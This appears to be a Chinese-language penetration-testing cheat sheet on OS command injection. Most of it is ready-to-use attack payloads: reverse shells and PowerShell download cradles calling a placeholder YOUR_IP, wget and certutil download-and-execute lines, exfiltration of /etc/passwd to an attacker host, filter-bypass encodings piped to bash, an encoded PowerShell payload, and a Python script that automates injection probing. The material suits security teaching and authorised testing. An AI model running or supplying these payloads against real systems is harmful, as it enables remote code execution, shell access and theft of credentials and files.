---
id: 03-007
title: "⌨️ 命令注入 (Command Injection)"
category: 漏洞利用
category_en: Exploitation
difficulty: ★★★
tools: "Commix, 手动Payload构造"
last_updated: 2025-07
tags: ["exploitation", "web-attack", "sql-injection", "penetration-testing", "metasploit"]
subdomain: exploitation
nist_csf: ["DE.CM-08", "PR.IP-12"]
mitre_attack: ["T1190", "T1505", "T1203", "T1210"]
---
# ⌨️ 命令注入 (Command Injection)

## 概述
通过注入操作系统命令，在服务器上执行任意系统命令，获取远程代码执行权限。

## 核心技能

### 1. 命令注入检测

```bash
# 基本命令分隔符
# Linux:
; id            # 分号
| id            # 管道
`id`            # 反引号
$(id)           # 命令替换
& id            # 后台运行
&& id           # 逻辑与
|| id           # 逻辑或
%0a id          # 换行符

# Windows:
| whoami        # 管道
& whoami        # 命令分隔符
|| whoami       # 条件执行
&& whoami       # 条件执行

# 盲注入测试（通过延时判断）
; sleep 5
| sleep 5
& ping -c 5 127.0.0.1

# 带外注入测试（通过DNS/HTTP回调）
; curl http://YOUR_SERVER/test
| nslookup YOUR_SERVER
& wget http://YOUR_SERVER/test

# POST参数注入
curl -s -X POST https://example.com/ping \
  -d "host=127.0.0.1;id" \
  -d "ip=127.0.0.1|whoami"
```

### 2. 命令注入利用

```bash
# 文件读取
; cat /etc/passwd
| type C:\Windows\win.ini   # Windows

# 目录列表
; ls -la
| dir                       # Windows

# 反弹Shell
; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
| powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).downloadString('http://YOUR_IP/shell.ps1')"

# 下载执行
; wget http://YOUR_IP/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
| certutil -urlcache -f http://YOUR_IP/shell.exe shell.exe && shell.exe

# 数据外传
; curl http://YOUR_IP/$(whoami)
; curl -d @/etc/passwd http://YOUR_IP/
```

### 3. 盲命令注入

```bash
# 时间盲注
; sleep $(whoami | wc -c)         # 基于用户名长度延时
| ping -n 5 127.0.0.1            # Windows 5秒延时
& sleep 5 && echo "delay_test"

# 布尔盲注
; if [ -f /etc/passwd ]; then echo yes; fi
; if [ -d /var/www ]; then sleep 5; fi

# 带外注入验证
; curl http://YOUR_IP:4444/$(hostname)
& nslookup $(whoami).YOUR_DOMAIN
```

### 4. 绕过过滤技巧

```bash
# 绕过空格过滤
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd            # 制表符

# 绕过关键字过滤
# 使用环境变量
$9cat$9/etc/passwd
c'at' /etc/passwd
c"at" /etc/passwd
/???/c?t /???/?????d         # 通配符

# Base64编码执行
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash

# Hex编码执行
echo 636174202f6574632f706173737764 | xxd -r -p | bash

# 无字母数字shell
# 使用${_}或$()构造命令
$_='$\'\\143\\141\\164\\40\\47\\42'  # cat

# 使用dev/fd
cat /dev/fd/0 < /etc/passwd

# 使用斜杠绕过
echo 'p' | tr 'p' '#'         # 替换字符

# 空字节注入
c%00at /etc/passwd

# 换行绕过
c\
at /etc/passwd
```

### 5. Windows命令注入特定技巧

```powershell
# PowerShell编码命令
powershell -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAHkAbwB1AHIALQBzAGUAcgB2AGUAcgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=

# 使用管道
dir | whoami
type C:\users\*\.ssh\id_rsa

# 使用cmd特殊字符
; %PATH:~0,1%md            # 环境变量截取
| cmd /c "whoami"

# Windows变量混淆
%a%w%h%o%a%m%i%            # 自动扩展为whoami

# 使用findstr读取文件
type c:\flag.txt | findstr ".*"
```

### 6. 命令注入自动化

```python
#!/usr/bin/env python3
# cmd_injection_automation.py

import requests
import sys
import urllib.parse

def test_injection(url, param, payloads):
    """测试命令注入"""
    for payload in payloads:
        test_url = url.replace(f"{{{param}}}", urllib.parse.quote(payload))
        try:
            r = requests.get(test_url, timeout=10)
            if "uid=" in r.text or "root" in r.text:
                print(f"[+] Command injection found! Payload: {payload}")
                print(f"[+] Response: {r.text[:200]}")
                return True
        except:
            pass
    return False

def blind_detection(url, param):
    """盲注入检测"""
    # 时间盲注
    time_payloads = [
        "; sleep 5",
        "| sleep 5",
        "& ping -c 5 127.0.0.1",
        "`sleep 5`"
    ]
    for payload in time_payloads:
        test_url = url.replace(f"{{{param}}}", urllib.parse.quote(payload))
        try:
            start = __import__('time').time()
            r = requests.get(test_url, timeout=15)
            elapsed = __import__('time').time() - start
            if elapsed >= 4:
                print(f"[+] Time-based injection: {payload} ({elapsed:.1f}s)")
        except:
            pass

# 使用示例
if __name__ == "__main__":
    url = "https://example.com/ping?host={param}"
    payloads = [
        "; id",
        "| id",
        "& whoami",
        "`id`",
        "$(id)",
        "%0Aid"
    ]
    test_injection(url, "param", payloads)
    blind_detection(url, "param")
```

### 7. 命令注入漏洞利用案例

```bash
# 案例1: Ping功能
# 检测: 127.0.0.1;id
# 利用: 127.0.0.1;bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'

# 案例2: DNS查询
# 检测: example.com || whoami
# 利用: example.com;cat /etc/passwd

# 案例3: 文件处理工具
# FFmpeg命令注入
# 输入文件: ;id;.mp4
# 输出: ffmpeg -i ";id;.mp4" output.mp4

# 案例4: Mail命令
# sendmail -t < email.txt
# email.txt中包含: ; cat /etc/passwd | mail attacker@evil.com

# 案例5: 数据库命令
# MySQL: SELECT * FROM users WHERE name='admin'; SELECT * FROM users
# PostgreSQL: ;COPY users TO '/tmp/out.txt';

# 案例6: Python eval/exec
# eval("__import__('os').system('id')")
# exec("import os; os.system('id')")

# 案例7: Node.js
# require('child_process').exec('whoami')
# execSync('whoami')
```

## 命令注入检测清单

| 检测点 | 测试方法 |
|:---|:---|
| Ping功能 | `127.0.0.1;id` |
| DNS查询 | `example.com|whoami` |
| 网络工具 | `8.8.8.8 && whoami` |
| 文件下载 | `url||id` |
| 转换功能 | `input;id` |
| 发送邮件 | `to@a.com;cat /etc/passwd` |
| 用户输入渲染 | `name={{id}}` |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Commix | 命令注入自动化 | https://github.com/commixproject/commix |
| Burp Intruder | 手动Fuzz | https://portswigger.net/burp |
| PayloadsAllTheThings | Payload集合 | https://github.com/swisskyrepo/PayloadsAllTheThings |

## 参考资源
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Commix Project](https://github.com/commixproject/commix)
- [HackTricks - Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
